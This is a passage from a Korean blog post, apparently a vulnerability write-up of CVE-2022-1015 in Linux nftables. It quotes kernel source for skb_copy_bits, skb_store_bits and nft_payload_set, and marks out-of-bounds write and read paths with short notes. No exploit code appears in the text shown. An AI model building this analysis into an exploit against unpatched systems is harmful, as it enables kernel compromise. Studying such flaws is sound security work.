</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">skb_walk_frags</span>(skb, frag_iter) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> end;
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">WARN_ON</span>(start <span style="color:#f92672">&gt;</span> offset <span style="color:#f92672">+</span> len);
</span></span><span style="display:flex;"><span>		end <span style="color:#f92672">=</span> start <span style="color:#f92672">+</span> frag_iter<span style="color:#f92672">-&gt;</span>len;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ((copy <span style="color:#f92672">=</span> end <span style="color:#f92672">-</span> offset) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (copy <span style="color:#f92672">&gt;</span> len)
</span></span><span style="display:flex;"><span>				copy <span style="color:#f92672">=</span> len;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">skb_copy_bits</span>(frag_iter, offset <span style="color:#f92672">-</span> start, to, copy))
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> fault;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> ((len <span style="color:#f92672">-=</span> copy) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>			offset <span style="color:#f92672">+=</span> copy;
</span></span><span style="display:flex;"><span>			to     <span style="color:#f92672">+=</span> copy;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		start <span style="color:#f92672">=</span> end;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>len)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>fault:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EFAULT;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EXPORT_SYMBOL</span>(skb_copy_bits);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">skb_copy_from_linear_data_offset</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb,
</span></span><span style="display:flex;"><span>						    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">int</span> offset, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>to,
</span></span><span style="display:flex;"><span>						    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memcpy</span>(to, skb<span style="color:#f92672">-&gt;</span>data <span style="color:#f92672">+</span> offset, len);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>OOB write</p>
<h3 id="nft_payload_set_ops">nft_payload_set_ops<a hidden class="anchor" aria-hidden="true" href="#nft_payload_set_ops">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">nft_payload_set_init</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nft_ctx <span style="color:#f92672">*</span>ctx,
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nft_expr <span style="color:#f92672">*</span>expr,
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nlattr <span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span> tb[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nft_payload_set <span style="color:#f92672">*</span>priv <span style="color:#f92672">=</span> <span style="color:#a6e22e">nft_expr_priv</span>(expr);
</span></span><span style="display:flex;"><span>	priv<span style="color:#f92672">-&gt;</span>base        <span style="color:#f92672">=</span> <span style="color:#a6e22e">ntohl</span>(<span style="color:#a6e22e">nla_get_be32</span>(tb[NFTA_PAYLOAD_BASE]));
</span></span><span style="display:flex;"><span>	priv<span style="color:#f92672">-&gt;</span>offset      <span style="color:#f92672">=</span> <span style="color:#a6e22e">ntohl</span>(<span style="color:#a6e22e">nla_get_be32</span>(tb[NFTA_PAYLOAD_OFFSET]));
</span></span><span style="display:flex;"><span>	priv<span style="color:#f92672">-&gt;</span>len         <span style="color:#f92672">=</span> <span style="color:#a6e22e">ntohl</span>(<span style="color:#a6e22e">nla_get_be32</span>(tb[NFTA_PAYLOAD_LEN]));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (tb[NFTA_PAYLOAD_CSUM_TYPE])
</span></span><span style="display:flex;"><span>		priv<span style="color:#f92672">-&gt;</span>csum_type <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ntohl</span>(<span style="color:#a6e22e">nla_get_be32</span>(tb[NFTA_PAYLOAD_CSUM_TYPE]));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (tb[NFTA_PAYLOAD_CSUM_OFFSET])
</span></span><span style="display:flex;"><span>		priv<span style="color:#f92672">-&gt;</span>csum_offset <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ntohl</span>(<span style="color:#a6e22e">nla_get_be32</span>(tb[NFTA_PAYLOAD_CSUM_OFFSET]));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (tb[NFTA_PAYLOAD_CSUM_FLAGS]) {
</span></span><span style="display:flex;"><span>		u32 flags;
</span></span><span style="display:flex;"><span>		flags <span style="color:#f92672">=</span> <span style="color:#a6e22e">ntohl</span>(<span style="color:#a6e22e">nla_get_be32</span>(tb[NFTA_PAYLOAD_CSUM_FLAGS]));
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (flags <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>NFT_PAYLOAD_L4CSUM_PSEUDOHDR)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
</span></span><span style="display:flex;"><span>		priv<span style="color:#f92672">-&gt;</span>csum_flags <span style="color:#f92672">=</span> flags;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">switch</span> (priv<span style="color:#f92672">-&gt;</span>csum_type) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> NFT_PAYLOAD_CSUM_NONE:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> NFT_PAYLOAD_CSUM_INET:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> NFT_PAYLOAD_CSUM_SCTP:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (priv<span style="color:#f92672">-&gt;</span>base <span style="color:#f92672">!=</span> NFT_PAYLOAD_TRANSPORT_HEADER)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (priv<span style="color:#f92672">-&gt;</span>csum_offset <span style="color:#f92672">!=</span> <span style="color:#a6e22e">offsetof</span>(<span style="color:#66d9ef">struct</span> sctphdr, checksum))
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EOPNOTSUPP;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">nft_parse_register_load</span>(tb[NFTA_PAYLOAD_SREG], <span style="color:#f92672">&amp;</span>priv<span style="color:#f92672">-&gt;</span>sreg,
</span></span><span style="display:flex;"><span>				       priv<span style="color:#f92672">-&gt;</span>len);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>여기서 아까 그거 호출된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">nft_payload_set_eval</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nft_expr <span style="color:#f92672">*</span>expr,
</span></span><span style="display:flex;"><span>				 <span style="color:#66d9ef">struct</span> nft_regs <span style="color:#f92672">*</span>regs,
</span></span><span style="display:flex;"><span>				 <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nft_pktinfo <span style="color:#f92672">*</span>pkt)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nft_payload_set <span style="color:#f92672">*</span>priv <span style="color:#f92672">=</span> <span style="color:#a6e22e">nft_expr_priv</span>(expr);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb <span style="color:#f92672">=</span> pkt<span style="color:#f92672">-&gt;</span>skb;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> u32 <span style="color:#f92672">*</span>src <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>regs<span style="color:#f92672">-&gt;</span>data[priv<span style="color:#f92672">-&gt;</span>sreg];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> offset, csum_offset;
</span></span><span style="display:flex;"><span>	__wsum fsum, tsum;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">switch</span> (priv<span style="color:#f92672">-&gt;</span>base) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> NFT_PAYLOAD_LL_HEADER:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">skb_mac_header_was_set</span>(skb))
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> err;
</span></span><span style="display:flex;"><span>		offset <span style="color:#f92672">=</span> <span style="color:#a6e22e">skb_mac_header</span>(skb) <span style="color:#f92672">-</span> skb<span style="color:#f92672">-&gt;</span>data;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> NFT_PAYLOAD_NETWORK_HEADER:
</span></span><span style="display:flex;"><span>		offset <span style="color:#f92672">=</span> <span style="color:#a6e22e">skb_network_offset</span>(skb);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> NFT_PAYLOAD_TRANSPORT_HEADER:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pkt<span style="color:#f92672">-&gt;</span>tprot_set)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> err;
</span></span><span style="display:flex;"><span>		offset <span style="color:#f92672">=</span> <span style="color:#a6e22e">nft_thoff</span>(pkt);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">BUG</span>();
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	csum_offset <span style="color:#f92672">=</span> offset <span style="color:#f92672">+</span> priv<span style="color:#f92672">-&gt;</span>csum_offset;
</span></span><span style="display:flex;"><span>	offset <span style="color:#f92672">+=</span> priv<span style="color:#f92672">-&gt;</span>offset;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((priv<span style="color:#f92672">-&gt;</span>csum_type <span style="color:#f92672">==</span> NFT_PAYLOAD_CSUM_INET <span style="color:#f92672">||</span> priv<span style="color:#f92672">-&gt;</span>csum_flags) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>	    (priv<span style="color:#f92672">-&gt;</span>base <span style="color:#f92672">!=</span> NFT_PAYLOAD_TRANSPORT_HEADER <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>	     skb<span style="color:#f92672">-&gt;</span>ip_summed <span style="color:#f92672">!=</span> CHECKSUM_PARTIAL)) {
</span></span><span style="display:flex;"><span>		fsum <span style="color:#f92672">=</span> <span style="color:#a6e22e">skb_checksum</span>(skb, offset, priv<span style="color:#f92672">-&gt;</span>len, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>		tsum <span style="color:#f92672">=</span> <span style="color:#a6e22e">csum_partial</span>(src, priv<span style="color:#f92672">-&gt;</span>len, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (priv<span style="color:#f92672">-&gt;</span>csum_type <span style="color:#f92672">==</span> NFT_PAYLOAD_CSUM_INET <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>		    <span style="color:#a6e22e">nft_payload_csum_inet</span>(skb, src, fsum, tsum, csum_offset))
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> err;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (priv<span style="color:#f92672">-&gt;</span>csum_flags <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>		    <span style="color:#a6e22e">nft_payload_l4csum_update</span>(pkt, skb, fsum, tsum) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> err;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">skb_ensure_writable</span>(skb, <span style="color:#a6e22e">max</span>(offset <span style="color:#f92672">+</span> priv<span style="color:#f92672">-&gt;</span>len, <span style="color:#ae81ff">0</span>)) <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">skb_store_bits</span>(skb, offset, src, priv<span style="color:#f92672">-&gt;</span>len) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> err;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (priv<span style="color:#f92672">-&gt;</span>csum_type <span style="color:#f92672">==</span> NFT_PAYLOAD_CSUM_SCTP <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>	    pkt<span style="color:#f92672">-&gt;</span>tprot <span style="color:#f92672">==</span> IPPROTO_SCTP <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>	    skb<span style="color:#f92672">-&gt;</span>ip_summed <span style="color:#f92672">!=</span> CHECKSUM_PARTIAL) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">nft_payload_csum_sctp</span>(skb, <span style="color:#a6e22e">nft_thoff</span>(pkt)))
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> err;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>err:
</span></span><span style="display:flex;"><span>	regs<span style="color:#f92672">-&gt;</span>verdict.code <span style="color:#f92672">=</span> NFT_BREAK;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">skb_store_bits</span>(<span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb, <span style="color:#66d9ef">int</span> offset, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>from, <span style="color:#66d9ef">int</span> len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> start <span style="color:#f92672">=</span> <span style="color:#a6e22e">skb_headlen</span>(skb);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>frag_iter;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> i, copy;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (offset <span style="color:#f92672">&gt;</span> (<span style="color:#66d9ef">int</span>)skb<span style="color:#f92672">-&gt;</span>len <span style="color:#f92672">-</span> len)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> fault;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((copy <span style="color:#f92672">=</span> start <span style="color:#f92672">-</span> offset) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (copy <span style="color:#f92672">&gt;</span> len)
</span></span><span style="display:flex;"><span>			copy <span style="color:#f92672">=</span> len;
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">skb_copy_to_linear_data_offset</span>(skb, offset, from, copy);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ((len <span style="color:#f92672">-=</span> copy) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>		offset <span style="color:#f92672">+=</span> copy;
</span></span><span style="display:flex;"><span>		from <span style="color:#f92672">+=</span> copy;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">skb_shinfo</span>(skb)<span style="color:#f92672">-&gt;</span>nr_frags; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">skb_frag_t</span> <span style="color:#f92672">*</span>frag <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">skb_shinfo</span>(skb)<span style="color:#f92672">-&gt;</span>frags[i];
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> end;
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">WARN_ON</span>(start <span style="color:#f92672">&gt;</span> offset <span style="color:#f92672">+</span> len);
</span></span><span style="display:flex;"><span>		end <span style="color:#f92672">=</span> start <span style="color:#f92672">+</span> <span style="color:#a6e22e">skb_frag_size</span>(frag);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ((copy <span style="color:#f92672">=</span> end <span style="color:#f92672">-</span> offset) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>			u32 p_off, p_len, copied;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">struct</span> page <span style="color:#f92672">*</span>p;
</span></span><span style="display:flex;"><span>			u8 <span style="color:#f92672">*</span>vaddr;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (copy <span style="color:#f92672">&gt;</span> len)
</span></span><span style="display:flex;"><span>				copy <span style="color:#f92672">=</span> len;
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">skb_frag_foreach_page</span>(frag,
</span></span><span style="display:flex;"><span>					      <span style="color:#a6e22e">skb_frag_off</span>(frag) <span style="color:#f92672">+</span> offset <span style="color:#f92672">-</span> start,
</span></span><span style="display:flex;"><span>					      copy, p, p_off, p_len, copied) {
</span></span><span style="display:flex;"><span>				vaddr <span style="color:#f92672">=</span> <span style="color:#a6e22e">kmap_atomic</span>(p);
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">memcpy</span>(vaddr <span style="color:#f92672">+</span> p_off, from <span style="color:#f92672">+</span> copied, p_len);
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">kunmap_atomic</span>(vaddr);
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> ((len <span style="color:#f92672">-=</span> copy) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>			offset <span style="color:#f92672">+=</span> copy;
</span></span><span style="display:flex;"><span>			from <span style="color:#f92672">+=</span> copy;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		start <span style="color:#f92672">=</span> end;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">skb_walk_frags</span>(skb, frag_iter) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> end;
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">WARN_ON</span>(start <span style="color:#f92672">&gt;</span> offset <span style="color:#f92672">+</span> len);
</span></span><span style="display:flex;"><span>		end <span style="color:#f92672">=</span> start <span style="color:#f92672">+</span> frag_iter<span style="color:#f92672">-&gt;</span>len;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ((copy <span style="color:#f92672">=</span> end <span style="color:#f92672">-</span> offset) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (copy <span style="color:#f92672">&gt;</span> len)
</span></span><span style="display:flex;"><span>				copy <span style="color:#f92672">=</span> len;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">skb_store_bits</span>(frag_iter, offset <span style="color:#f92672">-</span> start,
</span></span><span style="display:flex;"><span>					   from, copy))
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> fault;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> ((len <span style="color:#f92672">-=</span> copy) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>			offset <span style="color:#f92672">+=</span> copy;
</span></span><span style="display:flex;"><span>			from <span style="color:#f92672">+=</span> copy;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		start <span style="color:#f92672">=</span> end;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>len)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>fault:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EFAULT;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EXPORT_SYMBOL</span>(skb_store_bits);
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">skb_copy_to_linear_data_offset</span>(<span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb,
</span></span><span style="display:flex;"><span>						  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">int</span> offset,
</span></span><span style="display:flex;"><span>						  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>from,
</span></span><span style="display:flex;"><span>						  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memcpy</span>(skb<span style="color:#f92672">-&gt;</span>data <span style="color:#f92672">+</span> offset, from, len);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>OOB read</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> NFT_META_L4PROTO:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pkt<span style="color:#f92672">-&gt;</span>tprot_set)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> err;
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nft_reg_store8</span>(dest, pkt<span style="color:#f92672">-&gt;</span>tprot);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (pkt<span style="color:#f92672">-&gt;</span>tprot <span style="color:#f92672">!=</span> IPPROTO_TCP <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>	    pkt<span style="color:#f92672">-&gt;</span>tprot <span style="color:#f92672">!=</span> IPPROTO_UDP) {
</span></span><span style="display:flex;"><span>		regs<span style="color:#f92672">-&gt;</span>verdict.code <span style="color:#f92672">=</span> NFT_BREAK;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define IPPROTO_UDP		IPPROTO_UDP
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">enum</span> {
</span></span><span style="display:flex;"><span>  IPPROTO_IP <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,		<span style="color:#75715e">/* Dummy protocol for TCP		*/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define IPPROTO_IP		IPPROTO_IP
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  IPPROTO_ICMP <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>,		<span style="color:#75715e">/* Internet Control Message Protocol	*/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define IPPROTO_ICMP		IPPROTO_ICMP
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  IPPROTO_IGMP <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>,		<span style="color:#75715e">/* Internet Group Management Protocol	*/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define IPPROTO_IGMP		IPPROTO_IGMP
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  IPPROTO_IPIP <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>,		<span style="color:#75715e">/* IPIP tunnels (older KA9Q tunnels use 94) */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define IPPROTO_IPIP		IPPROTO_IPIP
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  IPPROTO_TCP <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>,		<span style="color:#75715e">/* Transmission Control Protocol	*/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define IPPROTO_TCP		IPPROTO_TCP
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  IPPROTO_EGP <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>,		<span style="color:#75715e">/* Exterior Gateway Protocol		*/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define IPPROTO_EGP		IPPROTO_EGP
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  IPPROTO_PUP <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>,		<span style="color:#75715e">/* PUP protocol				*/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define IPPROTO_PUP		IPPROTO_PUP
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  IPPROTO_UDP <span style="color:#f92672">=</span> <span style="color:#ae81ff">17</span>,		<span style="color:#75715e">/* User Datagram Protocol		*/</span>
</span></span></code></pre></div><p>매크로 열심히 뒤져봤더니 L4proto 부분 어떻게 필터링하는지 알 수 있었다.
17번 사용한다.</p>
<p><img loading="lazy" src="/blog/CVE-2022-1015_Linux_kernel/e3cc47cfdebbd9e92dd0172a7241e9d9.png" alt=""  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">enum</span> nft_payload_bases {
</span></span><span style="display:flex;"><span>	NFT_PAYLOAD_LL_HEADER,
</span></span><span style="display:flex;"><span>	NFT_PAYLOAD_NETWORK_HEADER,
